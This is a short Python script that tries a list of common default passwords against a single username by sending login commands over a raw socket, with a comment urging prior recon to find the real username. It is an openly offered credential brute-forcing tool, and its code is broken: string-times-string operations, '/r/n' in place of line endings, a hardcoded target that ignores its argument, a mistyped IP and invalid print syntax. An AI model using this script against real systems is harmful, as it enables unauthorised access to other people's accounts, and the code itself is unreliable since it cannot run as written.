#!/usr/bin/env python
import socket
import re
import sys
from colors import *

sys.stdout.write('blue')
def connection(ip,user,passw):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    sys.stdout.write('red')
    print('Trying' + ip + ':' + user + ':' + passw)
    sock.connect(('192.168.1.0',80))

    data = sock.recv(1024)
    sock.send('User' + user * '/r/n')
    data = sock.recv(1024)

    sock.send('password' + passw * '/r/n')
    data = sock.recv(1024)

    sock.send('Quit' * '/ r/n')
    sock.close()

    return data

user = 'User1'
# in the username it would be awesome if you've done some recon and know the username else default
# also feel free to modify the username<<<
password = ['pass1', 'pass2', 'pass3', 'admin','adm','1234','']
#here this are the passwords of trial to be tried
for password in password:
    print[connection('192.160.1.0',user,password)]
